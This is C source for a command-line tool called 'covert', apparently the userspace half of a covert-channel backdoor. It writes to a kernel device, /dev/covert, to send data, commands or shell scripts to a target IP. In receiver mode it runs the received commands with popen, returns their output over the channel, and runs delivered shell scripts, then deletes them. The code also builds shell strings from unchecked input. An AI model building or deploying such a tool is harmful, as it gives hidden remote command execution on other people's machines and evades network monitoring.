#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#define DEVNAME "/dev/covert"
#define MAX_OUTPRINT_SIZE 0x7FFF

void print_help_message(void);
unsigned int ipstr2addr(const char* ip_str);
int read_file(const char *fname, char *tar);
int run_command(const char *command);
int run_sh_file(const char *fname);
int write_to_module(const char *dname, unsigned int ip, const char *data, int size, int type);
void print_all(void);

enum MODE
{
    MD_SEND,
    MD_RESP
};

enum TYPE
{
    TP_DATA,
    TP_COMD,
    TP_SHFL,
    TP_ACKN
};

static unsigned int ip = 0;

int main(int argc, char *argv[])
{
    int loaded_argv;
    int type = TP_DATA, mode = MD_SEND;
    char *arg;

    if (argc == 1 || argv[1][0] != '-')
    {
        print_help_message();
        return 0;
    }
    if (argc == 2 && !strcmp(argv[1], "-h"))
    {
        print_help_message();
        return 0;
    }
    loaded_argv = 1;
    while (loaded_argv < argc)
    {
        if (argv[loaded_argv][0] != '-')
        {
            puts("Error: invaild argument.");
            exit(-1);
        }
        switch (argv[loaded_argv][1])
        {
        case 'i': ip = ipstr2addr(argv[loaded_argv + 1]); loaded_argv += 2; break;
        case 'n': ip = atoi(argv[loaded_argv + 1]); loaded_argv += 2; break;
        case 'c': type = TP_COMD; arg = argv[loaded_argv + 1]; loaded_argv += 2; break;
        case 'd': type = TP_DATA; arg = argv[loaded_argv + 1]; loaded_argv += 2; break;
        case 's': type = TP_SHFL; arg = argv[loaded_argv + 1]; loaded_argv += 2; break;
        case 'S': mode = MD_SEND; loaded_argv++; break;
        case 'R': mode = MD_RESP; loaded_argv++; break;
        case 'P': print_all(); return 0;
        default: print_help_message(); exit(0);
        }
    }
    if (!ip)
    {
        puts("Error: No ip address specified!");
        exit(0);
    }
    if (mode == MD_SEND)
    {
        switch (type)
        {
        case TP_SHFL:
        {
            char fcont[MAX_OUTPRINT_SIZE];
            int size;
            size = read_file(arg, fcont);
            write_to_module(DEVNAME, ip, fcont, size, type);
            break;
        }
        
        case TP_COMD:
        case TP_DATA:
            write_to_module(DEVNAME, ip, arg, strlen(arg), type);
            break;
        }
    }
    else if (mode == MD_RESP)
    {
        switch (type)
        {
            case TP_DATA:
                write_to_module(DEVNAME, ip, arg, strlen(arg), TP_DATA);
                break;
            case TP_COMD:
                {
                    run_command(arg);
                    break;
                }
            case TP_SHFL:
                {
                    run_sh_file(arg);
                    
                    char rmfile[strlen(arg) + 10];
                    strcpy(rmfile, "rm ");
                    strcat(rmfile, arg);
                    system(rmfile);
                    break;
                }
        }
    }
    return 0;
}

void print_help_message(void)
{
    puts("Usage: covert [options]");
    puts("");
    puts("Options:");
    puts("    -i <ip>           指定目标IP地址");
    puts("    -n <ip>           指定目标IP地址(以4字节数字表示)");
    puts("    -c <command>      运行命令");
    puts("    -d <data>         发送数据");
    puts("    -s <file>         运行shell脚本");
    puts("    -h                显示此帮助信息");
    puts("");
    puts("    -S                作为发送方(默认)");
    puts("    -R                作为接收方");
    puts("    -P                打印所有数据到日志");
}

unsigned int ipstr2addr(const char* ip_str)
{
    unsigned int ipp[4];
    if (sscanf(ip_str, "%u.%u.%u.%u", ipp + 0, ipp + 1, ipp + 2, ipp + 3) != 4)
    {
        puts("Error: invaild ip string.");
        exit(-1);
    }
    return (ipp[3] << 24) + (ipp[2] << 16) + (ipp[1] << 8) + ipp[0];
}

int read_file(const char *fname, char *tar)
{
    FILE *fp = fopen(fname, "rb");
    int size;
    if (!fp)
    {
        printf("Error: failed to open file %s.", fname);
        exit(-1);
    }
    size = fread(tar, 1, MAX_OUTPRINT_SIZE, fp);
    fclose(fp);
    return size;
}

int run_command(const char *command)
{
    char cache[MAX_OUTPRINT_SIZE];
    char cmd[10 + strlen(command)];
    FILE *fp;
    int strsize;

    strcpy(cmd, command);
    strcat(cmd, " 2>&1");
    fp = popen(cmd, "r");
    if (!fp)
    {
        exit(-1);
    }
    while (fgets(cache, MAX_OUTPRINT_SIZE, fp))
    {
        strsize = strlen(cache);
        if (cache[strsize - 1] == '\n')
        {
            cache[strsize - 1] = '\0';
            strsize--;
        }
        if (strsize)
            write_to_module(DEVNAME, ip, cache, strsize, TP_DATA);
    }
    pclose(fp);
    return 0;
}

int run_sh_file(const char *fname)
{
    char cmd[10 + strlen(fname)];
    strcpy(cmd, "sh ");
    strcat(cmd, fname);
    return run_command(cmd);
}

int write_to_module(const char *dname, unsigned int ip, const char *data, int size, int type)
{
    int fd, offset = 0;
    if (!size)
    {
        return 0;
    }
    fd = open(dname, O_RDWR);
    if (fd == -1)
    {
        printf("%s\n", data);
        return -1;
    }
    char buf[size + sizeof(unsigned int) + sizeof(int) * 2 + 1];

    memcpy(buf + offset, &ip, sizeof(unsigned int));
    offset += sizeof(unsigned int);
    memcpy(buf + offset, &size, sizeof(int));
    offset += sizeof(int);
    memcpy(buf + offset, &type, sizeof(int));
    offset += sizeof(int);
    memcpy(buf + offset, data, size + 1);
    offset += size;

    write(fd, buf, offset);
    close(fd);
    return 0;
}

void print_all(void)
{
    int fd, offset = 0;
    fd = open(DEVNAME, O_RDWR);
    if (fd == -1)
    {
        printf("Error: failed to open file %s!\n", DEVNAME);
        return;
    }
    lseek(fd, 0, 0);
    close(fd);
}
